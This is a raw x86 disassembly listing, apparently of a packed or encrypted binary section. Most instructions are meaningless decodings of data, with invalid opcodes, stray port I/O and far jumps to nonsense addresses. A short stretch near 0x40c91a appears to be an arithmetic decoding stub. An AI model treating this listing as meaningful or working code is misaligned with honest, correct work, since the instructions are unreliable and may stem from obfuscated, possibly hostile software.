  40c700:	repz cmp eax,0x5086ec39
  40c706:	sbb    bl,bl
  40c708:	sub    al,0x6a
  40c70a:	rol    BYTE PTR [esi+0x19],0x84
  40c70e:	jmp    0x13cdc743
  40c713:	in     al,0x81
  40c715:	push   ebp
  40c716:	mov    edi,0x1af9e292
  40c71b:	sahf   
  40c71c:	out    0x34,al
  40c71e:	pop    ebp
  40c71f:	ret    
  40c720:	push   esp
  40c721:	lods   eax,DWORD PTR ds:[esi]
  40c722:	cmp    bl,BYTE PTR [edi+edi*4+0x2b23900]
  40c729:	ret    0xc798
  40c72c:	popf   
  40c72d:	(bad)  
  40c72e:	mov    dl,0x8c
  40c730:	adc    eax,0x577d7dda
  40c735:	enter  0xd92b,0xbc
  40c739:	sub    eax,edi
  40c73b:	xchg   ebp,eax
  40c73c:	mov    bl,0xa4
  40c73e:	jne    0x40c756
  40c740:	xchg   ebx,eax
  40c741:	fisubr WORD PTR [esi-0x29d36173]
  40c747:	ins    DWORD PTR es:[edi],dx
  40c748:	repnz stos BYTE PTR es:[edi],al
  40c74a:	jl     0x40c75c
  40c74c:	sbb    al,0xd5
  40c74e:	out    dx,al
  40c74f:	ret    
  40c750:	mov    ebp,DWORD PTR [esi+0x58]
  40c753:	jno    0x40c75d
  40c755:	jmp    0x40c72b
  40c757:	sbb    DWORD PTR [ecx-0x7d],eax
  40c75a:	fwait
  40c75b:	jb     0x40c751
  40c75d:	mov    dh,0x7
  40c75f:	push   ebp
  40c760:	scas   al,BYTE PTR es:[edi]
  40c761:	jb     0x40c70a
  40c763:	(bad)  
  40c764:	in     eax,dx
  40c765:	ins    DWORD PTR es:[edi],dx
  40c766:	xchg   esi,eax
  40c767:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c768:	fcomip st,st(5)
  40c76a:	add    ah,BYTE PTR [ecx-0x14c6d27f]
  40c770:	je     0x40c7cf
  40c772:	sbb    edx,DWORD PTR ds:0x21b862da
  40c778:	in     eax,0xde
  40c77a:	ss int3 
  40c77c:	in     al,0x9
  40c77e:	sub    al,0x51
  40c780:	cmp    DWORD PTR [edx+ebp*2],ebp
  40c783:	out    0x15,eax
  40c785:	and    DWORD PTR [edi-0x7a4f931b],ebx
  40c78b:	sets   BYTE PTR [esi+ecx*1-0x13abf2aa]
  40c793:	push   0x5eb43c2f
  40c798:	jg     0x40c7db
  40c79a:	loop   0x40c76e
  40c79c:	xchg   ebp,eax
  40c79d:	jb     0x40c727
  40c79f:	sbb    eax,0xf02f713a
  40c7a4:	cmc    
  40c7a5:	xchg   edx,eax
  40c7a6:	out    0xd8,eax
  40c7a8:	fistp  QWORD PTR [ecx+ebp*4]
  40c7ab:	shl    ebx,cl
  40c7ad:	sbb    DWORD PTR [esi-0x65896bc0],esi
  40c7b3:	mov    ds:0x9794c931,eax
  40c7b8:	call   0x986facb
  40c7bd:	mov    WORD PTR [ebp+0xca5b72a],gs
  40c7c3:	and    al,0x5d
  40c7c5:	cmp    edi,DWORD PTR [edi-0x52d60ad9]
  40c7cb:	cmp    BYTE PTR [edx-0x64],cl
  40c7ce:	pop    ecx
  40c7cf:	rol    DWORD PTR [eax],cl
  40c7d1:	js     0x40c758
  40c7d3:	inc    esp
  40c7d4:	mov    eax,0x3ce51cf3
  40c7d9:	push   ss
  40c7da:	(bad)  
  40c7db:	cld    
  40c7dc:	test   DWORD PTR [edx+0x55],edi
  40c7df:	sub    al,0x13
  40c7e1:	sbb    al,0xb0
  40c7e3:	mov    ebp,0xd1a29f82
  40c7e8:	fdivr  QWORD PTR [edx]
  40c7ea:	push   edi
  40c7eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c7ec:	test   DWORD PTR [esi],esp
  40c7ee:	sbb    al,0x5c
  40c7f0:	cli    
  40c7f1:	xchg   cl,dl
  40c7f3:	push   0xffffffd9
  40c7f5:	call   0x9fd0:0x23b54f09
  40c7fc:	inc    ecx
  40c7fd:	out    dx,al
  40c7fe:	or     DWORD PTR [edx-0x2d6da379],0xffffffdf
  40c805:	repnz xchg esp,eax
  40c807:	jge    0x40c850
  40c809:	(bad)  
  40c80a:	fadd   QWORD PTR [ebx+0x2c15ca61]
  40c810:	sbb    eax,0x85691fe
  40c815:	sbb    edx,ecx
  40c817:	aas    
  40c818:	bound  ebp,QWORD PTR [edx+0xa530b6]
  40c81e:	fabs   
  40c820:	daa    
  40c821:	cmp    BYTE PTR [eax-0x29],0xd0
  40c825:	mov    edi,?
  40c827:	outs   dx,BYTE PTR ds:[esi]
  40c828:	outs   dx,DWORD PTR ds:[esi]
  40c829:	iret   
  40c82a:	sbb    eax,0x43b2f0f8
  40c82f:	(bad)  
  40c830:	lds    ecx,FWORD PTR [edx-0x6bbfb969]
  40c836:	cwde   
  40c837:	jmp    0x8f4b:0x4fa524
  40c83e:	inc    ecx
  40c83f:	adc    DWORD PTR [edx],ecx
  40c841:	lea    ebp,[ebx+ecx*4]
  40c844:	cmp    al,0x1e
  40c846:	popa   
  40c847:	fstp   QWORD PTR [edx]
  40c849:	inc    edi
  40c84a:	pop    ebp
  40c84b:	lds    esi,FWORD PTR [eax+0x37]
  40c84e:	xchg   esi,eax
  40c84f:	inc    ebp
  40c850:	cmp    dh,bh
  40c852:	pop    es
  40c853:	adc    al,al
  40c855:	pop    ebp
  40c856:	mov    bl,0x73
  40c858:	pushw  es
  40c85a:	ja     0x40c7e6
  40c85c:	(bad)  
  40c85d:	sti    
  40c85e:	xor    al,0x5c
  40c860:	or     esp,edx
  40c862:	imul   ecx,DWORD PTR [edi],0x2a13b777
  40c868:	or     bh,cl
  40c86a:	rcr    DWORD PTR [ebx],1
  40c86c:	icebp  
  40c86d:	data16 xor BYTE PTR [ebp-0x4c3d75d3],ch
  40c874:	jge    0x40c8ed
  40c876:	iret   
  40c877:	dec    edi
  40c878:	mov    al,ds:0xc24020a1
  40c87d:	loope  0x40c847
  40c87f:	push   ss
  40c880:	retf   0xb780
  40c883:	adc    BYTE PTR [eax],cl
  40c885:	cmp    ebp,esi
  40c887:	loope  0x40c820
  40c889:	hlt    
  40c88a:	mov    esp,0xfdd181c
  40c88f:	ficomp WORD PTR [ebx]
  40c891:	enter  0x1e73,0xb8
  40c895:	add    eax,0x3a228604
  40c89a:	or     dl,BYTE PTR [ebx]
  40c89c:	outs   dx,BYTE PTR ds:[esi]
  40c89d:	mov    bl,0x86
  40c89f:	pop    ds
  40c8a0:	fisttp DWORD PTR [ecx+0x7c]
  40c8a3:	ins    DWORD PTR es:[edi],dx
  40c8a4:	inc    esp
  40c8a5:	xlat   BYTE PTR ds:[ebx]
  40c8a6:	je     0x40c83a
  40c8a8:	xchg   ebp,eax
  40c8a9:	ins    DWORD PTR es:[edi],dx
  40c8aa:	dec    esi
  40c8ab:	lods   eax,DWORD PTR ds:[esi]
  40c8ac:	jl     0x40c88b
  40c8ae:	cld    
  40c8af:	dec    esp
  40c8b0:	xlat   BYTE PTR ds:[ebx]
  40c8b1:	adc    ebx,esi
  40c8b3:	(bad)  
  40c8b6:	or     eax,0xfb48e344
  40c8bb:	jo     0x40c8e5
  40c8bd:	(bad)  
  40c8be:	cmp    DWORD PTR [eax+0x4b2a9b45],ebp
  40c8c4:	addr16 push cs
  40c8c6:	ja     0x40c8d5
  40c8c8:	xchg   esi,eax
  40c8c9:	cmp    DWORD PTR [ecx+0x5264daa],edx
  40c8cf:	cmp    ebp,DWORD PTR [eax-0x77]
  40c8d2:	push   0xc
  40c8d4:	gs jmp 0x3517:0x21d127bc
  40c8dc:	jge    0x40c870
  40c8de:	jo     0x40c90f
  40c8e0:	int    0xb2
  40c8e2:	sub    BYTE PTR cs:[edx],al
  40c8e5:	jmp    0x40c878
  40c8e7:	pop    esp
  40c8e8:	rcr    BYTE PTR [eax+eiz*8-0x6caec93c],0x3
  40c8f0:	dec    ebp
  40c8f1:	rcr    BYTE PTR [ecx-0x76],1
  40c8f4:	popf   
  40c8f5:	sar    ah,1
  40c8f7:	pop    ds
  40c8f8:	and    DWORD PTR [esi],edx
  40c8fa:	sbb    eax,0x7865925
  40c8ff:	dec    ecx
  40c900:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c901:	js     0x40c8e7
  40c903:	jp     0x40c922
  40c905:	or     eax,0xb1c80de1
  40c90a:	pop    edi
  40c90b:	fidiv  WORD PTR [edx-0x62]
  40c90e:	mov    cl,0x12
  40c910:	outs   dx,BYTE PTR ds:[esi]
  40c911:	(bad)  
  40c912:	call   0xf68b:0x2584563e
  40c919:	cwde   
  40c91a:	mov    eax,DWORD PTR [ebp-0x20]
  40c91d:	mov    edx,DWORD PTR [ebp-0x8]
  40c920:	mov    edi,DWORD PTR [ebp-0x24]
  40c923:	xor    edx,ecx
  40c925:	add    edx,esi
  40c927:	imul   edx,edi
  40c92a:	sub    DWORD PTR [eax],edx
  40c92c:	mov    eax,DWORD PTR [ebp-0x14]
  40c92f:	jmp    0x40b5ea
  40c934:	mov    eax,DWORD PTR [ebp-0xc]
  40c937:	mov    edx,DWORD PTR [ebp-0x18]
  40c93a:	xor    eax,edx
  40c93c:	cmp    eax,0x7a0d5426
  40c941:	je     0x40b5e7
  40c947:	mov    eax,DWORD PTR [ebp-0x10]
  40c94a:	add    DWORD PTR [eax],0x7403502
  40c950:	jmp    0x40b5e7
  40c955:	mov    eax,DWORD PTR [ebp-0x1c]
  40c958:	jmp    0x40cc71
  40c95d:	rol    ebx,cl
  40c95f:	(bad)
  40c962:	leave  
  40c963:	rcr    ebx,1
  40c965:	mov    al,ds:0xa4c5e53
  40c96a:	or     BYTE PTR ss:[edi],dh
  40c96d:	xor    bl,BYTE PTR [ebp+0x7e747878]
  40c973:	js     0x40c9ed
  40c975:	xor    al,0xf9
  40c977:	les    edx,FWORD PTR [edx]
  40c979:	dec    edx
  40c97a:	adc    BYTE PTR [edi+edi*1-0x4],dh
  40c97e:	fisubr WORD PTR [ecx-0x76]
  40c981:	lods   al,BYTE PTR ds:[esi]
  40c982:	pop    ebx
  40c983:	aas    
  40c984:	mov    edi,DWORD PTR [ecx]
  40c986:	sbb    eax,0xc00718cd
  40c98c:	sbb    al,0x64
  40c98e:	jl     0x40c95a
  40c990:	mov    DWORD PTR ds:0xe2139cb6,eax
  40c996:	lahf   
  40c997:	loopne 0x40c996
  40c999:	imul   eax,DWORD PTR [ebx-0x3f],0x30
  40c99d:	repnz xor eax,DWORD PTR [edi-0x35]
  40c9a1:	scas   al,BYTE PTR es:[edi]
  40c9a2:	or     al,0x8f
  40c9a4:	sub    al,0xe
  40c9a6:	js     0x40ca22
  40c9a8:	hlt    
  40c9a9:	ret    
  40c9aa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c9ab:	mov    esi,0x803f7a2b
  40c9b0:	sub    DWORD PTR [esp+ebx*2-0x52],ecx
  40c9b4:	icebp  
  40c9b5:	xlat   BYTE PTR ds:[ebx]
  40c9b6:	or     eax,0xaaaefdc4
  40c9bb:	mov    dh,0xcf
  40c9bd:	cmp    eax,0x4c0f4b89
  40c9c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c9c3:	loop   0x40ca34
  40c9c5:	mov    ebp,0xc6dc2c95
  40c9ca:	out    dx,eax
  40c9cb:	push   es
  40c9cc:	cmp    eax,0x38248aa
  40c9d1:	lahf   
  40c9d2:	dec    DWORD PTR [ecx]
  40c9d4:	mov    DWORD PTR [ecx],edi
  40c9d6:	fcmovbe st,st(1)
  40c9d8:	jmp    0x6a7:0xcce1e29f
  40c9df:	xchg   edi,eax
  40c9e0:	stc    
  40c9e1:	popa   
  40c9e2:	sub    DWORD PTR [esi-0x6bc42b43],0x41
  40c9e9:	mov    ?,ebp
  40c9eb:	add    ebx,DWORD PTR [edx-0x38]
  40c9ee:	out    0x2c,eax
  40c9f0:	lahf   
  40c9f1:	in     eax,0x1e
  40c9f3:	push   0x919a20d
  40c9f8:	aaa    
  40c9f9:	inc    ecx
  40c9fa:	cs stos BYTE PTR es:[edi],al
  40c9fc:	imul   ecx,esp,0xffffffae
  40c9ff:	in     al,dx
  40ca00:	fsubp  st(1),st
  40ca02:	ja     0x40ca09
  40ca04:	xor    DWORD PTR [edx+0x1e42c655],0x20
  40ca0b:	sub    BYTE PTR [edx-0x4f5b59db],al
  40ca11:	add    BYTE PTR [ecx+ecx*1+0x31],0xe6
  40ca16:	jb     0x40ca28
  40ca18:	sub    BYTE PTR [edi+0xa400496],bl
  40ca1e:	jns    0x40ca7d
  40ca20:	pusha  
  40ca21:	ret    
  40ca22:	scas   eax,DWORD PTR es:[edi]
  40ca23:	data16 jle 0x40ca20
  40ca26:	bound  esi,QWORD PTR [edi]
  40ca28:	or     edi,ebx
  40ca2a:	mov    al,ds:0xcd068b56
  40ca2f:	adc    al,0x15
  40ca31:	sub    eax,0x41173a73
  40ca36:	push   ds
  40ca37:	dec    eax
  40ca38:	int    0x78
  40ca3a:	loope  0x40ca87
  40ca3c:	mov    edi,0x3bb5ae79
  40ca41:	pop    ebp
  40ca42:	rcr    DWORD PTR [ebp+0x53],0xe
  40ca46:	stos   DWORD PTR es:[edi],eax
  40ca47:	shl    DWORD PTR [edx+esi*8-0x12],cl
  40ca4b:	cs arpl ax,si
  40ca4e:	div    DWORD PTR [eax+0x5674601]
  40ca54:	neg    DWORD PTR [ebx-0x1dba547f]
  40ca5a:	push   ebx
  40ca5b:	lods   al,BYTE PTR ds:[esi]
  40ca5c:	xchg   ebp,eax
  40ca5d:	xor    bh,dl
  40ca5f:	inc    eax
  40ca60:	sahf   
  40ca61:	out    0x80,eax
  40ca63:	jb     0x40cac9
  40ca65:	dec    ebx
  40ca66:	and    esp,edi
  40ca68:	xchg   edx,eax
  40ca69:	stos   BYTE PTR es:[edi],al
  40ca6a:	test   DWORD PTR [eax],ebx
  40ca6c:	cmc    
  40ca6d:	or     cl,BYTE PTR [ecx-0x5831322e]
  40ca73:	ficom  WORD PTR [eax+0x4493bb93]
  40ca79:	mov    eax,0x403c5f40
  40ca7e:	hlt    
  40ca7f:	sti    
  40ca80:	jo     0x40ca31
  40ca82:	xor    BYTE PTR [eax+0x5d],0x47
  40ca86:	test   al,0x44
  40ca88:	aas    
  40ca89:	dec    ebx
  40ca8a:	mov    fs,WORD PTR [ecx]
  40ca8c:	sub    BYTE PTR [edx-0x1999f27c],bl
  40ca92:	mov    dh,0xf5
  40ca94:	mov    al,ds:0xff38d60a
  40ca99:	retf   0xce04
  40ca9c:	adc    al,BYTE PTR [ecx]
  40ca9e:	and    bl,BYTE PTR [ebp+0x2c8326b9]
  40caa4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40caa5:	add    dh,0x84
  40caa8:	sbb    BYTE PTR [edx+0x3b371329],ah
  40caae:	push   ss
  40caaf:	loop   0x40caf2
  40cab1:	or     dh,dh
  40cab3:	iret   
  40cab4:	fst    QWORD PTR [edi]
  40cab6:	in     eax,0x8d
  40cab8:	sbb    al,0x12
  40caba:	dec    edx
  40cabb:	das    
  40cabc:	push   ss
  40cabd:	test   eax,0x39a45c7c
  40cac2:	adc    BYTE PTR [edi+eiz*1],0x21
  40cac6:	xor    eax,edx
  40cac8:	jb     0x40caac
  40caca:	jne    0x40cac6
  40cacc:	call   0x9cf6d45a
  40cad1:	xor    ecx,0x667a7735
  40cad7:	jp     0x40ca7b
  40cad9:	mov    ebx,0xcc45662d
  40cade:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cadf:	cmp    esp,0xffffffe6
  40cae2:	mov    edx,0x65c43bc3
  40cae7:	in     eax,dx
  40cae8:	and    edx,edi
  40caea:	shl    DWORD PTR [ebp-0x2db3ba63],0xdf
  40caf1:	test   al,0xed
  40caf3:	shr    BYTE PTR [eax],0x5b
  40caf6:	not    BYTE PTR [ebx+0x25]
  40caf9:	jno    0x40cb29
  40cafb:	call   0x3f17:0xff01bb2f
  40cb02:	or     dl,BYTE PTR [ebx]
  40cb04:	fnstsw WORD PTR [edx]
  40cb06:	mov    cl,0xa2
  40cb08:	scas   al,BYTE PTR es:[edi]
  40cb09:	nop
  40cb0a:	ret    0x6ce
  40cb0d:	jl     0x40cb22
  40cb0f:	xchg   esp,eax
  40cb10:	(bad)  
  40cb11:	pushf  
  40cb12:	nop
  40cb13:	aaa    
  40cb14:	jno    0x40cb0a
  40cb16:	std    
  40cb17:	cmc    
  40cb18:	in     al,dx
  40cb19:	xlat   BYTE PTR ds:[ebx]
  40cb1a:	pop    edi
  40cb1b:	pop    eax
  40cb1c:	push   ecx
  40cb1d:	inc    ebp
  40cb1e:	xor    eax,0x791c9874
  40cb23:	sub    bh,BYTE PTR [eax+eax*1-0x225cf539]
  40cb2a:	inc    edi
  40cb2b:	cwde   
  40cb2c:	mov    edx,0x50f4c32a
  40cb31:	push   ecx
  40cb32:	adc    eax,0x8ab15d9c
  40cb37:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cb38:	inc    esi
  40cb39:	jg     0x40cb59
  40cb3b:	jle    0x40cb3f
  40cb3d:	cli    
  40cb3e:	xchg   ebx,eax
  40cb3f:	mov    dl,0x39
  40cb41:	lock dec esi
  40cb43:	or     al,0xb4
  40cb45:	inc    esi
  40cb46:	sahf   
  40cb47:	sbb    BYTE PTR [eax+eax*1-0x55],bl
  40cb4b:	je     0x40cb50
  40cb4d:	jnp    0x40cb9e
  40cb4f:	jbe    0x40cb19
  40cb51:	iret   
  40cb52:	ficom  DWORD PTR [ebx+0x1f]
  40cb55:	cmp    BYTE PTR ds:0x97fc9635,0x0
  40cb5c:	dec    edx
  40cb5d:	push   0x150b2583
  40cb62:	dec    esp
  40cb63:	xchg   DWORD PTR ds:0x1e0479ff,edx
  40cb69:	sub    ebp,edi
  40cb6b:	(bad)  
  40cb6c:	and    BYTE PTR [ecx],dh
  40cb6e:	test   BYTE PTR [ebp*2+0x673ace1c],0xa1
  40cb76:	pop    es
  40cb77:	arpl   WORD PTR [edi-0x11],bx
  40cb7a:	dec    esi
  40cb7b:	scas   al,BYTE PTR es:[edi]
  40cb7c:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cb7e:	cs adc al,0xe
  40cb81:	ja     0x40cb7d
  40cb83:	frstor [ebp-0x3ac2b6ee]
  40cb89:	cwde   
  40cb8a:	adc    BYTE PTR [edi-0x42],bl
  40cb8d:	sahf   
  40cb8e:	mov    edi,ss
  40cb90:	sbb    dh,bl
  40cb92:	or     eax,0x6975dc6b
  40cb97:	pop    ss
  40cb98:	jp     0x40cb60
  40cb9a:	mov    dl,0x84
  40cb9c:	aam    0xef
  40cb9e:	inc    ecx
  40cb9f:	cmp    DWORD PTR ss:[edi+0x2d0c7882],eax
  40cba6:	fbstp  TBYTE PTR [ebp-0x16]
  40cba9:	imul   esp,DWORD PTR [ebx],0xce76f764
  40cbaf:	lea    esi,[esi]
  40cbb1:	add    BYTE PTR [esi],0x3
  40cbb4:	sar    DWORD PTR [edi],cl
  40cbb6:	sbb    ch,BYTE PTR [eax+esi*4]
  40cbb9:	jmp    0x4d4f:0x3ad3e307
  40cbc0:	cmp    dl,bh
  40cbc2:	sbb    BYTE PTR [ecx],cl
  40cbc4:	in     al,0xa0
  40cbc6:	mov    WORD PTR [ebx+ebx*4+0xc],ds
  40cbca:	pop    ebp
  40cbcb:	and    DWORD PTR [esi-0x1a],0x67
  40cbcf:	ret    0x3c4
  40cbd2:	pop    esp
  40cbd3:	mov    ds:0x41801e6f,al
  40cbd8:	dec    edx
  40cbd9:	push   0xffffffc8
  40cbdb:	ds dec esp
  40cbdd:	fcom   DWORD PTR [ebx]
  40cbdf:	jge    0x40cb6e
  40cbe1:	out    0xd5,eax
  40cbe3:	jl     0x40cc62
  40cbe5:	adc    bh,BYTE PTR [esi+eiz*2-0x6acb3f61]
  40cbec:	das    
  40cbed:	pop    eax
  40cbee:	or     ecx,0x3a
  40cbf1:	xchg   BYTE PTR [edx-0x191320ba],ch
  40cbf7:	and    DWORD PTR [ebx+ebp*8],0xa788a38d
  40cbfe:	xor    ecx,ebp
  40cc00:	xchg   ebp,eax
  40cc01:	loopne 0x40cbf0
  40cc03:	test   BYTE PTR [eax],dl
  40cc05:	inc    edi
  40cc07:	mov    eax,ds:0x1b3eb290
  40cc0c:	sub    ebp,DWORD PTR [ebp+0x74]
  40cc0f:	aaa    
  40cc10:	mov    dh,0x59
  40cc12:	out    0x67,eax
  40cc14:	shl    DWORD PTR [edx-0x350d9168],cl
  40cc1a:	in     eax,dx
  40cc1b:	pop    ds
  40cc1c:	xchg   ebp,eax
  40cc1d:	adc    al,0x7c
  40cc1f:	retf   
  40cc20:	stos   BYTE PTR es:[edi],al
  40cc21:	js     0x40cc75
  40cc23:	fnsave [eax+eiz*2-0x70]
  40cc27:	mov    esp,0x3b96ec55
  40cc2c:	enter  0x1c19,0x5d
  40cc30:	lea    ebp,[edi]
  40cc32:	cdq    
  40cc33:	fstp   TBYTE PTR [edx+0x57dcce9a]
  40cc39:	jae    0x40cbc2
  40cc3b:	aas    
  40cc3c:	or     bl,BYTE PTR [edx+0x24dc9ea0]
  40cc42:	imul   edi,DWORD PTR [ebp-0xd82824a],0x75
  40cc49:	push   edi
  40cc4a:	test   eax,0x8ba9f38
  40cc4f:	xchg   edx,eax
  40cc50:	or     eax,0xdcdcc9d7
  40cc55:	pop    ebx
  40cc56:	lock push es
  40cc58:	push   ss
  40cc59:	test   al,0xb5
  40cc5b:	mov    BYTE PTR [edx],ah
  40cc5d:	and    eax,0x9ee55131
  40cc62:	and    dh,BYTE PTR [esi]
  40cc64:	outs   dx,BYTE PTR ds:[esi]
  40cc65:	dec    ebx
  40cc66:	fdivr  QWORD PTR [ecx+0x35]
  40cc69:	mov    esi,DWORD PTR [edx+0x29695fc0]
  40cc6f:	jb     0x40cc4b
  40cc71:	cmp    DWORD PTR [eax],edi
  40cc73:	jmp    0x40cf8c
  40cc78:	(bad)  
  40cc79:	(bad)  
  40cc7a:	rol    esp,1
  40cc7c:	ror    ebx,1
  40cc7e:	aad    0xda
  40cc80:	xchg   esi,eax
  40cc81:	mov    dl,0x71
  40cc83:	aad    0x7e
  40cc85:	sbb    edx,DWORD PTR [eax+0x78a22e39]
  40cc8b:	js     0x40cd01
  40cc8d:	jle    0x40cd07
  40cc8f:	js     0x40cc3d
  40cc91:	into   
  40cc92:	(bad)  
  40cc93:	int3   
  40cc94:	dec    ebp
  40cc95:	frndint 
  40cc97:	sub    ecx,DWORD PTR [edi]
  40cc99:	mov    bh,0x12
  40cc9b:	into   
  40cc9c:	lds    ecx,FWORD PTR [esp+eiz*2-0x51b485b0]
  40cca3:	cld    
  40cca4:	ficomp DWORD PTR [eax+ebx*2-0x38]
  40cca8:	fld    DWORD PTR [ecx]
  40ccaa:	mov    ebp,0xa33672f4
  40ccaf:	clc    
  40ccb0:	call   0x5e29511c
  40ccb5:	mov    dh,0x6f
  40ccb7:	daa    
  40ccb8:	sub    bh,BYTE PTR ds:[ebp-0x1f0b4efd]
  40ccbf:	or     DWORD PTR [eax],ebp
  40ccc1:	xchg   edx,eax
  40ccc2:	popf   
  40ccc3:	(bad)  
  40ccc4:	fbstp  TBYTE PTR [ebx]
  40ccc6:	jno    0x40ccf4
  40ccc8:	pop    edi
  40ccc9:	mov    edx,0x38280f3b
  40ccce:	dec    eax
  40cccf:	js     0x40cc90
  40ccd1:	outs   dx,BYTE PTR ds:[esi]
  40ccd2:	fcmovu st,st(1)
  40ccd4:	push   ebx
  40ccd5:	dec    edi
  40ccd6:	sub    eax,0x5cbcab4a
  40ccdb:	in     eax,0x43
  40ccdd:	sub    ch,BYTE PTR gs:[ecx-0x5b]
  40cce1:	xchg   BYTE PTR [ebx],dh
  40cce3:	ret    0x19e9
  40cce6:	mov    WORD PTR [edx-0x6c1938b7],gs
  40ccec:	xchg   esp,eax
  40cced:	jg     0x40cd35
  40ccef:	nop    DWORD PTR [edi-0x270fe7a3]
  40ccf6:	jnp    0x40cca1
  40ccf8:	test   ebx,esp
  40ccfa:	sub    edx,DWORD PTR [edi-0x5730ff90]
  40cd00:	mov    eax,esi
  40cd02:	test   DWORD PTR [edi],0x6fb785ef
  40cd08:	mov    al,0xa3
  40cd0a:	gs int3 
  40cd0c:	or     ebp,0x371779f8
  40cd12:	xchg   esp,esi
  40cd14:	loope  0x40cd6d
  40cd16:	jle    0x40cd8e
  40cd18:	push   ds
  40cd19:	and    BYTE PTR [esi],al
  40cd1b:	and    edx,ebx
  40cd1d:	jge    0x40cd20
  40cd1f:	dec    esi
  40cd20:	xor    DWORD PTR [edx],ebx
  40cd22:	test   BYTE PTR [esi-0x36b91b3c],bl
  40cd28:	mov    ds:0xf939e8b3,eax
  40cd2d:	jmp    DWORD PTR [eax+edi*4]
  40cd30:	pop    esp
  40cd31:	jbe    0x40cd90
  40cd33:	imul   eax,DWORD PTR [ecx+edi*4-0x3bb02168],0x1
  40cd3b:	nop
  40cd3c:	std    
  40cd3d:	mov    ?,WORD PTR [esi]
  40cd3f:	cmp    DWORD PTR ds:0x9409b55d,ebp
  40cd45:	test   DWORD PTR [edx-0x63],ecx
  40cd48:	(bad)  
  40cd49:	into   
  40cd4a:	out    dx,eax
  40cd4b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cd4c:	xchg   edx,eax
  40cd4d:	mov    ?,WORD PTR ds:0x6ce829a8
  40cd53:	leave  
  40cd54:	in     al,0x77
  40cd56:	sbb    eax,0x94ea4b24
  40cd5b:	mov    al,0xb9
  40cd5d:	je     0x40cd33
  40cd5f:	sahf   
  40cd60:	adc    ebx,DWORD PTR [edi]
  40cd62:	clc    
  40cd63:	(bad)  
  40cd64:	rcr    BYTE PTR [ecx+esi*2+0x6e409d70],1
  40cd6b:	loopne 0x40cdd1
  40cd6d:	sbb    ch,0xc5
  40cd70:	and    ecx,ecx
  40cd72:	mov    bl,0xd6
  40cd74:	xor    ch,BYTE PTR [edx+esi*8+0x1f]
  40cd78:	mov    al,0x8c
  40cd7a:	retf   
  40cd7b:	xchg   DWORD PTR [edx-0x57],ebp
  40cd7e:	xchg   ch,ah
  40cd80:	enter  0x11f8,0xa7
  40cd84:	add    BYTE PTR [edi-0x36],cl
  40cd87:	or     eax,0x8028bf79
  40cd8c:	fdiv   st(6),st
  40cd8e:	pop    esp
  40cd8f:	lods   eax,DWORD PTR ds:[esi]
  40cd90:	mov    WORD PTR [ecx-0x1d192396],es
  40cd96:	aas    
  40cd97:	test   bl,0xb
  40cd9a:	stos   BYTE PTR es:[edi],al
  40cd9b:	sbb    bh,dh
  40cd9d:	test   al,0x42
  40cd9f:	(bad)  
  40cda0:	enter  0x31c9,0x51
  40cda4:	xchg   edx,eax
  40cda5:	xor    edi,eax
  40cda7:	(bad)  
  40cda8:	cmc    
  40cda9:	jno    0x40cd9c
  40cdab:	test   al,0x6b
  40cdad:	or     DWORD PTR [ebx],edi
  40cdaf:	(bad)  
  40cdb1:	ins    BYTE PTR es:[edi],dx
  40cdb2:	outs   dx,BYTE PTR ds:[esi]
  40cdb3:	shl    BYTE PTR [esi+0x1a398b65],cl
  40cdb9:	jbe    0x40cdb3
  40cdbb:	fld    QWORD PTR [ecx+0x77]
  40cdbe:	mov    bh,0x65
  40cdc0:	adc    DWORD PTR [edi-0x31],ecx
  40cdc3:	push   0x1c60ae19
  40cdc8:	scas   eax,DWORD PTR es:[edi]
  40cdc9:	repnz pop ds
  40cdcb:	cmp    DWORD PTR [edi-0x2f],esi
  40cdce:	(bad)  
  40cdcf:	nop
  40cdd0:	test   BYTE PTR [eax+0x750be4da],ah
  40cdd6:	out    dx,eax
  40cdd7:	div    eax
  40cdd9:	rcl    BYTE PTR [ebx+0xda1d95a],cl
  40cddf:	mov    ebx,0x1e29abd6
  40cde4:	pop    edx
  40cde5:	rcl    BYTE PTR [ecx+0xb2c30e5],cl
  40cdeb:	(bad)  
  40cded:	in     al,0x83
  40cdef:	js     0x40cdb9
  40cdf1:	in     al,0x40
  40cdf3:	cdq    
  40cdf4:	fwait
  40cdf5:	sbb    al,0x8f
  40cdf7:	mov    bl,0xab
  40cdf9:	mov    ebp,0xb79943ed
  40cdfe:	nop
  40cdff:	pop    es
  40ce00:	xchg   edi,eax
  40ce01:	xchg   ebp,eax
  40ce02:	adc    esp,DWORD PTR [esi-0x17]
  40ce05:	stc    
  40ce06:	jb     0x40ce4c
  40ce08:	mov    BYTE PTR [ebx+0x4d],ah
  40ce0b:	push   edi
  40ce0c:	jnp    0x40cdee
  40ce0e:	imul   eax,ecx,0xfffffff7
  40ce11:	stos   BYTE PTR es:[edi],al
  40ce12:	out    dx,al
  40ce13:	adc    al,0x74
  40ce15:	push   cs
  40ce16:	sbb    al,0xe0
  40ce18:	mov    ds:0xe1388a83,eax
  40ce1d:	(bad)  
  40ce1e:	lds    ebx,FWORD PTR [ebx]
  40ce20:	loop   0x40ce9c
  40ce22:	and    DWORD PTR [ebx+0x58],eax
  40ce25:	jnp    0x40cdb8
  40ce27:	or     DWORD PTR cs:[edi-0x4080a95b],0xe53a9567
  40ce32:	adc    esp,DWORD PTR [ebp+0x1097dfe5]
  40ce38:	in     al,0xfb
  40ce3a:	xlat   BYTE PTR ds:[ebx]
  40ce3b:	pop    eax
  40ce3c:	mov    DWORD PTR [edi+0x17],eax
  40ce3f:	fdiv   QWORD PTR [esi-0x5e]
  40ce42:	out    dx,eax
  40ce43:	or     eax,0x59cc1438
  40ce48:	les    ecx,FWORD PTR [esi-0x66]
  40ce4b:	iret   
  40ce4c:	dec    edi
  40ce4d:	cs sub edx,esi
  40ce50:	mov    eax,DWORD PTR [edx]
  40ce52:	push   esp
  40ce53:	jmp    0x9690c3a1
